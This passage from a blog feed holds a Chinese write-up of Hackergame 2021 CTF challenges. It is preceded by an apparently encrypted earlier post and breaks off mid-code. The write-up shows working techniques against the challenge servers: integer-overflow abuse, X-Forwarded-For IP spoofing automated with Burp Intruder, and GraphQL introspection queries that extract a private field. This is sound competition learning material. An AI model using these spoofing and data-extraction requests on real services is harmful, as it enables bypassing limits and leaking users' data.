ls5FzIX1JdeJNzEUt31nIz5rEfhgXQa5eHFUqxrE7xZTzajOG0e&#x2F;CF&#x2F;xJeTt85iii40wTADQ875fgxnR6hBbqVGb6PVKekN&#x2F;1CNbCyqyp&#x2F;NbS8rS5Q+49NVtF8anddxlb6PkliqxlKlrBUmQKDT1d5tgkEeyNj8cBS4Ve3bJG4Pd526iqqmyW8y&#x2F;EiGLa6RwVe9VmUB2qp&#x2F;4GlWqZ&#x2F;tb4Z5T4KkXvpEv6MtV5+DHyjqlDNSmYcFL9N8Zk31TyVckkMWxcrvYZ+gZnCGqiQQPmCXhYfGlaMDkBhAZNSBZwX0c1fyKNCu7wA2D29l&#x2F;NquX2VfowrYAExOVlh6Gpa0O0BlyqCJYwI0lnaPpqhnhaDO6mTiokYuWOiQnSrVRBGHk2cxLKt0VH&#x2F;hL92mWc13+AmEemKcOJJaj9RRAWZ0t3H7WjgMhJgR26xJufcfES74EM1FEta1s8vboiDfcTOwXCdUInCnV0Pq2atGpq4oCxuM8YdlR+iopxMehFm&#x2F;FdR5tedsLN87jJIEC&#x2F;CJcWYLF3wE4lt9NOJk10ZHRxSgLS6&#x2F;42fGTFx+chZaN7JxAFhKPttpz3PG038aclzC7G&#x2F;fR0wUXnoi0U2Aide+DZfRWLn05rPDMRuodYTLet&#x2F;4GdbIgdGOqa0LReMei3+g8Ej+h2s0qRxb5fyixwjwCO1HDny5tK4Y3iG&#x2F;KbGXo0vsMymGcAQNphEn94EHk6oaBlHRbgtcwWOEqMlSLLyI5z3OqmoxK6WLj0Kw9g3YiSFSYhCNwa9gw9032cRSLxWDhGGBSF5T9wmjn2J7y4jgg1qrlQa1oTJ+Ep1jBsTQKJIds+E&#x2F;+XK3&#x2F;dCQLIBWkcQFGXblOkukLR&#x2F;uhCdMhhLcbsz1GqYI&#x2F;29K7A6uj+zm8Ep&#x2F;uLgpBQFrxFuIUYFQ4&#x2F;1OO&#x2F;ZkuscEGirPyeDkVeRHVjCt6JFCWUFC0X6ZNtbmSyD51BFNmv+gJroUxhddlWDADjDWI63N7tTWIPJ5mkv9VRM5WGZFrxSIiIZ9M4PXNTErzxRB3008xdtbUrKqlBuoPWsRK4Cea4IdiOyyISAtallenfMlWGvNV1FNzKY1CliJRLtEErg+5UurywxwuMDerKcMx5c&#x2F;+3MoCtFTCLOp3JI8uL6M2qWbSuRFd1Q6PEEH&#x2F;QUTHtmxopXhztQ5zoclhcKKugfxhz1iQLVRohWD&#x2F;xnbjahebmp9pV836wIjebrltKo31KpluhberLabcbIBtGAqtT6BtadXtcwPX5ensTQNN7U6xPE4IAREcClVchuzQGalwss2s1si9D64RHkqX97txTJQ3Yk7xuGa+OmPCNPCGGadbEKbrhIPpCI&#x2F;3ryILqToozUfDjXQrzl3rvNyxAy9pwtcWj1iBGFN&#x2F;8JBkCBi0B+IspyFYk65RkOfiXE6X1I6IjjYyAUszYInPfOeY8RKrSnuxBj401BlRljYkTALlITzxAzVBytpxQwP4Ofhj1Gty8JVBdsveNvA2M6fw524lGFOadqThTqdP330aqL1HrJhhw&#x2F;cZo+wAYmvo9dgrbDLlK8yDyLtBhRmCQAnwf&#x2F;CtdVK3bqAlw2xr2S0tBNIq5dC&#x2F;9QU+yiJSJlf57Ui186BnzLNLmfkpWxU5oW3RnWXaM21bqNvrarqnqEKxcQiTTP6Le1BDhuoceKzzB7rPlMjPO6GUXO3pFaZfMgwwPmNBvFEnCEsLngzjObiJARrEmtV&#x2F;I5RRTUXMAwCK5ookoSFfFVfqTih36sJOaBCCDR+TEkQ3zQE2ZvV35OTb586cPbvp0B3Vd+RRnF79Z4+56etRg38pDY9EEFj&#x2F;&#x2F;trgxQ&#x2F;QkYclWHqeUWm5pKhFZ+g2qLMlVs1K0q8d6sSsvt0R7iuDZtNZZLd9D&#x2F;lxyz7rkGT7DpqTpOjvRZqG+VGquYaLFId+xE6nqPM8CEWz1&#x2F;NT8691a6XX7qCdWSm78nmrZ&#x2F;IX4IGGc5LZBLo8j9sf9lXqGNqSYKOjdkEIKswoYTfxRk4y4&#x2F;cWo9f5nIbP+Vaw2bjZ5WKespE4CTAOxpk7DHXxh5wzYPld6NqjdYiaz1+DbLWVSIeRfX0h+bbsFal6+gDJ8hM5bHc5xrlim+nCloZXuBhEsd9ZEEIiGdew&#x2F;l72jCnlfZH&#x2F;tfxshLOAvJY86uGsytRp3UkGtDmnloRtJJ4lYB3aoIgcuQSt9NzyqU&#x2F;sK8ivilobtO3s9+iDykFnLmtpI&#x2F;c&#x2F;wZMQ6na0GuyohYe397yya9UosBdt5jhumBxntnIPVeqKCdavin&#x2F;P5AGbWo8LowD2pGyD0pHR9ptBYDuuIv4&#x2F;tBuskdK3HQHPCOGIFj8Syqc9LG29IwtySpz&#x2F;AkBEIg+81UJ5V+b5r7&#x2F;jjlepp8ow049YyDcKzNP8HGAhfmYtEPb0zZKcd7ZyGYhID9RfUwHrPRSdSFuGDZhiBYhdrI2lpXaUgsbpho+CjUp74Dl6pl2RX+YNZSbl3P4wVfNBMlmOHWqJ8UEctbb&#x2F;DVoSjs3C0kptMRBbBSwK8uUi9AR+Y17Ruti5Li7Hcc4iQ7FDJ7wnkAXD3KSGZ&#x2F;OEvM1ghAazhRMeKANiZ&#x2F;CGSidJwBq+PdF3RbqsshaWWjVi6oq9JktiCI78yJuZ+funSupw&#x2F;M0YXKyiuXD6ZrxMcG5PjTWb&#x2F;FH5XR2QtUTSwq&#x2F;z1yYnhXTjtMjP6kex7yda58C&#x2F;QD+0YBdKhyMxuwSzOixS5ryofQ5cavR&#x2F;4zOBtxmDewhTSII+eLpgqFMdzZFnG7Bk4ot1AHPCOxA1bdEn3IzH9GQ7NMo3G4kskakXZC3K5QHcsgUr+&#x2F;8k8fY79Utp&#x2F;3sq&#x2F;MqTgeml7NAau0jhkGbMANcr4jZj3N4tBsmo&#x2F;InMiI7+H7k1fDa32BrzdoevMfJYA3PaDHFRFuoeDlWAnxAAyk11kKjnidwQ&#x2F;rBqIzrdIBMAfyfbrA55Q47SBe7fwVrzFRBPKtjICzBPKzlIU5&#x2F;xIfDo3IpEY8h6emLxN3dLLLuIBoCtm7MqkB9MA7hzlEwkGPY0oUwtH323Y43Y69s1ldtzi+J+tVbCJrz2y1VVo1sLtoRgxkTqjqCtJpOi2Q7JLLX1433EQ8tywYvxCjuBH4N8GVPsUCuZFVpUZ7kQEfpCCmRnyyIE8myFbHHKBqq369PP49Pv6OzpkbHJ2ZictG9Yoi85ahlyqbnSacOAIfRBnruBBqo4KwTbAgbesupr0cCPEEMfb0pdyhFFC91RfG0H0ASsdfZk66Jfd2TCjagq8&#x2F;CKoCP2Vi+GLsV3du38v9uELTX3j3gxskoyDeb020ElGDk3L0rl2fIh8fa68knJSWs2z17N09NtGlNLzdbCu9AXBtq+bdxEOZXWk8u1o+YlFRFjphBNf9eMM3itN1&#x2F;5wv2A3e++qsB3t3ZCyaz7ltIdzmy5us9lgNIo4h4ZYpHyUeuQbAqqb40v2w+0g1e&#x2F;+9jtQJfZM+T+LEs16v8UQMB2Pr5Ug4lULpuYga76cbN&#x2F;zebqqe5ABGYWEIBFM+bxLvNv6c3v0VREhA1QvSEqLeYR6OV15tOIzjpJf4dGP6URUYyIz1UlJkEQZSjUFCq2H76YOtieydin+5wXwB&#x2F;s+jicn09aE6B3OYtp2CDBsDOdTtoOOzfz85Ee1dLhL9ogTrbaxkF0w8HRyACovRiag31U05liMpzg1CMVrDQo5qRUAdcNyJEXkSPbY88iZ75h&#x2F;+9N8JhSeJQzxrhl5nhlR9jct9H0RP8fGdt1EGlHCMsxGRVmRBAxykf2bt5N6qnN6&#x2F;Sjdfi0oPDxWdi3Y9M9ZWxgbqt5Tg&#x2F;UW6v9EGe0+hA8Ii&#x2F;Bq5Idw&#x2F;gFR5jlnTwKdB58apXtbtaYnyU3T7dAWwtZ4OvIfv7&#x2F;gpPbeyS1TqY71Gib1CW&#x2F;lWfIO&#x2F;0H98bOHPDIl8Ut3fi5xQG0yqHgQS165tTf2xo1i1sqD6tNDhCIDu&#x2F;1uefrNO3ExZh3Ea9Ac3428&#x2F;GWPVHlg4sqLKlZPds5NfKh0df+VPT3OLPLCH55NQXFtqwE&#x2F;ZsCguOl42vTcKWrkXl71Gp+X5x+mdAu+H1KNhU3f6p&#x2F;5sXiLyWT+T7h4SGvyOeBLUwJer4tFpByMATG560KhAuixXyzXwv8j70CyJp8s399T+N8eQhAxhXVBxgWdtl6Eu+rBPWbHmZXEH1&#x2F;mghBG+RFwuCh4jNPDeQDOBewYrmimmbpmFt1Iqz&#x2F;fuI5eSH8zQLMuzPKYhEG4p+5kPdBQkQz4NWzlrQ0yE2pXBvPNPngsljuC3pAVjRrUVb7MZtuO3BXPeDSb+EXgylh5rBmG7bkk43bdQ4TQyNs&#x2F;FYt7cQ7tFzBQUhWoIDNWKiEs0hThjLY4Aw9zFxuF3Uf9H+fU7GlwZBrsU+QdPR0vKxB5EeyHUamO&#x2F;NYRd5RtFNym4HhMqSEoTQPqLv79hzNyMyMvbrkOly&#x2F;nIwAyXmBmaVTVwVZr1fT+zXgzQL+VY5ByLjJrDw4ghbk67RGlX0qTyXV4mXY41j+0YZioIDBDJHP7D8QHrhQpzOzhMyxkQ7WvTLWEaZqbvGSXN619WL1j9XZOecnOAZazEm0BawPD9vVCMar6VD01ZKHIQVY6+EmdhaWr9j4afovGGPIeFaLzg1YwA6czDMdWH0pbZmV539qrs+sX+toGO5fXI7buTnjvcbi85wKSPj1xlvSIVYD05WH9EX2S8IsJrdLqxVlG4IQj4TIzUpbKxuChuNjDQO0idakciMB9Mkg7ZEolOltVBvZWv47UhoMZHfECUqQARpkRfl8B3YW37L1ihQC1HVpGSI9EiqCLd6ZD0cjg6+E1JK3yDZ3pr0or57JCMX2U0Lf3G3zDiZ9E+kit5C4HsNPCA4Xq9qLcEnSTbUrwR&#x2F;+Ol6DndvqxVSUjYEJCrmqp&#x2F;Fi1CY2XgCle5ojZ9IAWjrbg01FGZMCi3iiSfILVNcl8q4ZZFLweZbi+TivrAC+zRX8cpdCBSMrdC5pCMsIPvzRLJNm+jY32VdintOlE4xMHTk9rr2uNKJ4hQKJREyoz7XCYJrlo9LYIcS2o9lKo3xjSkpnC0SFtg0Sy&#x2F;pcpZw8wyOO2hTXOTmKzyOlw7VH1LtxTB14XoT95Y7euHiB&#x2F;11oz+6uOb3uRm4iql1s+tXka5CfeFhSt9xk3k4S91VDa7f3akOPDdxCQ701qVjM5&#x2F;aat2ARuoYfoghi1AwKpuWYchdLoYSrOiXX91SeH4gOR5UP8KXg2TnNOTvpHN5LRBKm58rMDe7ZmZCNM4AnubKNBP&#x2F;X8UNMaIokp3+I6KpH0c3jmTnSHnLwoi5oqfNx&#x2F;qT2K7ePGq3nqfTkCDqWKSWTe+QG6BsOXetF9mSKh8lPJbru3DfzZ6ICHsZIpfy8Vcfks5Hk+LT44&#x2F;jwWR9xz0B&#x2F;ia2bB6mG7X5Wo5AfbIFSVtrwYmm&#x2F;bx5Mib9QOK1U2X9zav7ObfFmMpENUCxEi1tr+bVQt&#x2F;iubPbpFZ6DNce8msWvzHhhV+81gn&#x2F;QQ3YW+yq&#x2F;Sm5CTP9pMfI72Mt6XCYtr1a6b&#x2F;vWaKnBKOL7dS7w5ORYbH9GlxhtEv4s5wdh+uqDjIZJp4jTt8ysEikkyJg8vj60Ymgd4Q6GEytoArUF7MfNB&#x2F;hYcgcCEOiOcVTRWL&#x2F;sLMDeaSklA1i9tVBUP95ROYnHIR4qoKdqBsEAbGBfjnNMiSwqp&#x2F;pdZIvF0LtjzRxgD5&#x2F;BOvxZtq9zpu8WTP+InLqLtMkXXffeNwM7fKFvfb3RNQfXMPa8wNMLD80D3NyeVEJBZ3AZzhEKaruVZMfhbS&#x2F;Nmcec9GF2nWQm2L8+qLxWbi0OM1lXBuCvMZ5DU8u5tr12a&#x2F;vTwM0CP4gZ0ga9TSNVb2vfJdtHDuC9BSlTB7KcA&#x2F;&#x2F;xvozzLKhfZEUQvmOoyxtzthFSf&#x2F;b3KhAUgu5GzrMSPPiEGNFIWbqm0UF9j5GStLEXm9fOuFvefZw5mH5q0zoIr4cbLFjRjE67EkG0riIEpGjoSG5c3GTsALEhfkv2VpxhSbtucDmKnftpHxYZQcJ+Atg9MnlcZ2mLE2wi8TqJ&#x2F;Y8ODehHR6ocioUPGxZJblrquxAjAARnsqNZ1eIJIO2vOH83HUg0zGhfq4ag4DEEwIxczSRqNnMSuSta+O80zpla9CVaDwcLUG7KMyu0pTrwSLtuGgSa14iE+SQza7jIJs8PTwwRMb7N89oOaXs3QWsmlSybak0pgJ+pZLCiPQYHgD91kaTCRDOOz2sX1F4FSe4OP8ehuEH5vVhcg2&#x2F;FRn0w5AfPRhz30XstZkZrJzYWLNLcB1uPC1bR5YD44AgaRPWQQmLdkmRj8ea5siGd3aDEPDAfNUUatAzwBsfZKZUis2P5LbAJpTjbxbQ9&#x2F;Y8b9aqafukEV3Vs23IEyTx4uRWGUqbpP&#x2F;e9vr6gFGcjM80TkKrsoiG6CuySRQUnUPGAmco8TZwI1ETwthdL5Xh2D82vI1Q93Lh1n194uCSLKPbVIFgxONJIKyIJFfAU&#x2F;kP9Beqb+oLoBulIbDeechaTNfe8RrzZM&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write-Up </tag>
            
            <tag> SchoolBus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackergame2021 部分WriteUp</title>
      <link href="/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/"/>
      <url>/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="yyyのWriteUp"><a href="#yyyのWriteUp" class="headerlink" title="yyyのWriteUp"></a>yyyのWriteUp</h1><hr><h2 id="一点碎碎念"><a href="#一点碎碎念" class="headerlink" title="一点碎碎念"></a>一点碎碎念</h2><p>这是我的第一次Hackergame&#x2F;CTF比赛，感觉很有意思。前几天心态有点崩，好在调整过来了。大家还是要把Hackergame当做game。最开心的是认识了好多大佬，抱大腿.jpg  </p><p><img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030161203937-1693462675.png"></p><p>对自己的吐槽：EasyRSA差点做出来，扩展欧几里得写错弃疗了；RAID0卡在软件没有激活码不让保存；和各种小测撞；各种体调不良，饮食睡眠不佳；晚上学校断电没法做，我又是大夜猫子……奇奇怪怪挡路的东西一直不少，归根结底还是太菜了啦。<br>总之非常感谢@TonyCrane大佬、GodSpeed大佬及群内各成员的鼓励支持帮助（膜不算）。<br>希望我能早日学会binary和math。  </p><hr><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>这题二分一下page参数即可。<br><del>鼠标连点器</del>  </p><hr><h2 id="进制十六——参上"><a href="#进制十六——参上" class="headerlink" title="进制十六——参上"></a>进制十六——参上</h2><p>使用Hex Editor Neo直接新建文件抄写即可。当然OCR识别也行吧。</p><hr><h2 id="去吧！追寻自由的电波"><a href="#去吧！追寻自由的电波" class="headerlink" title="去吧！追寻自由的电波"></a>去吧！追寻自由的电波</h2><p>下载音频后可以听出是一段人声，但是语速极快。于是使用Adobe Audition CC打开，效果-&gt;伸缩与变调放慢速度，适当调节音高就能开始听写了。可以发现这是<strong>NATO Phonetic Alphabet</strong>：</p><blockquote><p>A ALPHA<br>B BRAVO<br>C CHARLIE<br>D DELTA<br>E ECHO<br>F FOXTROT<br>G GOLF<br>H HOTEL<br>I INDIA<br>J JULIET<br>K KILO<br>L LIMA<br>M MIKE<br>N NOVEMBER<br>O OSCAR<br>P PAPA<br>Q QUEBEC<br>R ROMEO<br>S SIERRA<br>T TANGO<br>U UNIFORM<br>V VICTOR<br>W WHISKEY<br>X X-RAY<br>Y YANKEE<br>Z ZULU  </p></blockquote><hr><h2 id="猫咪问答-Pro-Max"><a href="#猫咪问答-Pro-Max" class="headerlink" title="猫咪问答 Pro Max"></a>猫咪问答 Pro Max</h2><p>General× 杂技√  </p><h4 id="1-经典WebArchive-第一行就有答案-20150504"><a href="#1-经典WebArchive-第一行就有答案-20150504" class="headerlink" title="1. 经典WebArchive 第一行就有答案:20150504"></a>1. <a href="http://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes">经典WebArchive</a> 第一行就有答案:20150504</h4><h4 id="2-https-lug-ustc-edu-cn-wiki-intro"><a href="#2-https-lug-ustc-edu-cn-wiki-intro" class="headerlink" title="2. https://lug.ustc.edu.cn/wiki/intro/"></a>2. <a href="https://lug.ustc.edu.cn/wiki/intro/">https://lug.ustc.edu.cn/wiki/intro/</a></h4><blockquote><p>此处资料显示是4次，但并非最新，我后来手动尝试才得知是5</p></blockquote><h4 id="3-FTP服务器-Obviously，答案是Development-Team-of-Library-后来得知网站首页news头图就有，我还找了好久"><a href="#3-FTP服务器-Obviously，答案是Development-Team-of-Library-后来得知网站首页news头图就有，我还找了好久" class="headerlink" title="3. FTP服务器 Obviously，答案是Development Team of Library 后来得知网站首页news头图就有，我还找了好久"></a>3. <a href="https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2016.06.16_%E6%B4%BB%E5%8A%A8%E5%AE%A4%E6%90%AC%E8%BF%81/IMG_20160616_133655.jpg">FTP服务器</a> Obviously，答案是Development Team of Library <del>后来得知网站首页news头图就有，我还找了好久</del></h4><h4 id="4-谷歌关键词SIGBOVIK2021-Newcomb-Benford直接就能找到原论文http-sigbovik-org-2021-proceedings-pdf-直接Ctrl-F找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13"><a href="#4-谷歌关键词SIGBOVIK2021-Newcomb-Benford直接就能找到原论文http-sigbovik-org-2021-proceedings-pdf-直接Ctrl-F找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13" class="headerlink" title="4. 谷歌关键词SIGBOVIK2021 Newcomb-Benford直接就能找到原论文http://sigbovik.org/2021/proceedings.pdf 直接Ctrl+F找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13"></a>4. 谷歌关键词<code>SIGBOVIK2021</code> <code>Newcomb-Benford</code>直接就能找到原论文<a href="http://sigbovik.org/2021/proceedings.pdf">http://sigbovik.org/2021/proceedings.pdf</a> 直接<code>Ctrl+F</code>找到文章，发现有14个Figures，排除第一个在Background里的Figure后得到答案为13</h4><h4 id="5-谷歌关键词protocol-report-找到https-www-rfc-editor-org-rfc-rfc8962-html"><a href="#5-谷歌关键词protocol-report-找到https-www-rfc-editor-org-rfc-rfc8962-html" class="headerlink" title="5. 谷歌关键词protocol report 找到https://www.rfc-editor.org/rfc/rfc8962.html"></a>5. 谷歌关键词<code>protocol</code> <code>report</code> 找到<a href="https://www.rfc-editor.org/rfc/rfc8962.html">https://www.rfc-editor.org/rfc/rfc8962.html</a></h4><blockquote><p> 6.Reporting Offenses<br>Send all your reports of possible violations and all tips about wrongdoing to <strong>&#x2F;dev&#x2F;null</strong>. The Protocol Police are listening and will take care of it.</p></blockquote><p><del>还挺幽默，一开始还真以为有police在listening</del></p><hr><h2 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h2><p>20不是3的倍数，乍看似乎不可能用6和9加和得到。但随便试了试，发现9斤的瓜很多很多时会溢出为-9223372036854775808，据此判断为int64溢出，判断应当在此处加以利用。<br>我们需要让这个数字稍微溢出一点，不能溢出太多。也就是略大于floor(9223372036854775808&#x2F;9)，使得溢出为-9223372036854775808以外的数字，并且让该数字到20的距离能被3整除。之后直接加回20就行（简单小学(?)算数，屡有即将做出来时加过头超过20的惨剧hhh）<br>灵感来源：<a href="https://www.bbsmax.com/A/pRdByjq65n/">CTF 两道web整数溢出题目(猫咪银行和ltshop)</a>  </p><hr><h2 id="透明的文件"><a href="#透明的文件" class="headerlink" title="透明的文件"></a>透明的文件</h2><p>根据题面和文件会发现这是终端的颜色代码，网络搜索终端颜色代码格式后将所有<code>[</code>前补上一个<code>\e</code>，然后<code>echo -e &quot;&#123;内容&#125;&quot;</code>就行啦。记得执行前把终端先用字符填满，不然可能画不完整。<br><img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154901529-149476643.jpg"></p><hr><h2 id="旅行照片"><a href="#旅行照片" class="headerlink" title="旅行照片"></a>旅行照片</h2><p><del>简简单单开个盒</del><br>旅游，海滩，汉字，说明这是国内一个海边旅游景点。<br>蓝色KFC？这可不常见，应该有不少人打卡了吧。<br>百度搜索<code>蓝色KFC</code>，第一项就是某红书的<code>秦皇岛蒂凡尼蓝秦皇岛网红打卡|国内唯一蒂芙尼蓝色肯德基</code><br>百度地图定位发现这家店是某海底世界分店，直接得到电话号码。<br><a href="https://www.earthol.org/">https://www.earthol.org/</a>上通过街景发现三个汉字“海|豚|馆”<br><img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154657507-2019993326.jpg"></p><p>对照地图，视线和海岸线大约成45°，推测应当在东南方向。进而发现影子西斜，应当在下午&#x2F;傍晚<br>通过绘制各个水平线找出灭点可以推测楼层（知乎有些文章有详细说明）。我的方法是找到对面楼“最矩形”变形最少的窗户判断为同一楼层，然后数，发现是13层左右（经尝试发现是14层）</p><hr><h2 id="FLAG助力大红包"><a href="#FLAG助力大红包" class="headerlink" title="FLAG助力大红包"></a>FLAG助力大红包</h2><p>既然是和ip有关，第一时间想到的就是<code>X-Forwarded-For</code>，果然成功了。因为每个<code>/8</code>ip段（也就是例如255.0.0.0-255.255.255.255）都只能算一次，我们使用BurpSuite的Intruder，将Post数据中的ip和<code>X-Forwarded-For</code>的ip首段打上标记，选择<code>Battering Ram</code>模式（让两处参数一致），构造0~255的字典，自动化访问<code>0.114.114.114</code>、<code>1.114.114.114</code>、<code>2.114.114.114</code>……<code>255.114.114.114</code>达成刚好256个助力获得flag。由于每次间隔2s，2s*256&#x3D;512s，小于题目时长限制10min&#x3D;600s所以是可行的。</p><hr><h2 id="Amnesia-轻度失忆"><a href="#Amnesia-轻度失忆" class="headerlink" title="Amnesia-轻度失忆"></a>Amnesia-轻度失忆</h2><p>直接<code>putchar()</code>逐个打印绕过即可。</p><hr><h2 id="图之上的信息"><a href="#图之上的信息" class="headerlink" title="图之上的信息"></a>图之上的信息</h2><p>GraphQL的利用。访问<code>/graphql?query=&#123;&#125;</code>发现存在利用可能。查阅<a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">资料</a>后得知可以利用内省注入。没有UI界面我直接地址栏输入。换行替换为<code>%0A</code>后，访问<code>/graphql?query=&#123;__schema%0A&#123;types%0A&#123;name&#125;&#125;&#125;</code>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&#123;&quot;__schema&quot;:&#123;&quot;types&quot;:[&#123;&quot;name&quot;:&quot;Query&quot;&#125;,&#123;&quot;name&quot;:&quot;GNote&quot;&#125;,&#123;&quot;name&quot;:&quot;Int&quot;&#125;,&#123;&quot;name&quot;:&quot;String&quot;&#125;,&#123;&quot;name&quot;:&quot;GUser&quot;&#125;,&#123;&quot;name&quot;:&quot;Boolean&quot;&#125;,&#123;&quot;name&quot;:&quot;__Schema&quot;&#125;,&#123;&quot;name&quot;:&quot;__Type&quot;&#125;,&#123;&quot;name&quot;:&quot;__TypeKind&quot;&#125;,&#123;&quot;name&quot;:&quot;__Field&quot;&#125;,&#123;&quot;name&quot;:&quot;__InputValue&quot;&#125;,&#123;&quot;name&quot;:&quot;__EnumValue&quot;&#125;,&#123;&quot;name&quot;:&quot;__Directive&quot;&#125;,&#123;&quot;name&quot;:&quot;__DirectiveLocation&quot;&#125;]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现有个<code>GUser</code>类型。接下来访问<code>/graphql?query=&#123;__type(name:&quot;GUser&quot;)&#123;name%0Afields&#123;name%0Atype&#123;name,kind&#125;&#125;&#125;&#125;</code>爆出字段名<code>privateEmail</code>，然后直接<code>/graphql?query=&#123;user(id:1)&#123;id,privateEmail&#125;&#125;</code>得到flag.</p><hr><h2 id="赛博厨房"><a href="#赛博厨房" class="headerlink" title="赛博厨房"></a>赛博厨房</h2><ul><li>Level0：直接写</li><li>Level1：复制粘贴发现有长度限制 goto优化行数<br> 然后不会了。</li></ul><hr><p>##阵列恢复大师-RAID5<br>直接丢进RAID Reconstructor 5里面跑得到镜像文件。Windows上并没法直接读，于是丢进Diskinternals Linux Reader里读文件导出。执行getflag.py却提示<code>Did you recover my data correctly?</code>，疑惑之下换WSL(Kali Linux)执行就成功了。<br><del>吐槽：RAID0的XFS需要注册码没法搞。WSL也mount不上，看来还是虚拟机靠谱。</del></p><hr><h2 id="助记词-第一顿大餐"><a href="#助记词-第一顿大餐" class="headerlink" title="助记词-第一顿大餐"></a>助记词-第一顿大餐</h2><p>代码审计后发现目的是延迟尽可能高。用BurpSuite改包在POST数据里复制出来很多行注记词提交就有了flag1。就像这样：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &quot;necessary science growth addition&quot;,</span><br><span class="line">    &quot;necessary science growth addition&quot;,</span><br><span class="line">    （重复好多好多次）</span><br><span class="line">    &quot;necessary science growth addition&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>如果不行CLEAR再试试。<br><img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030155443141-1922071122.jpg"></p><p>小坑：token要跟上才能拿到flag，不过有时自动获取的token无效，使得flag只显示为true，因为加号没有URLEncode转义，不知道是不是bug.  </p><hr><h2 id="马赛克"><a href="#马赛克" class="headerlink" title="马赛克"></a>马赛克</h2><p>模拟题。大概思路是先扫一遍，把能确定的先确定下来。之后再dfs剩下的块（不需要全部求出，毕竟这题的二维码纠错拉满了）。<br>代码很丑对吧QAQ（当时不熟悉ndarray操作，全部当做list做一遍）  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span 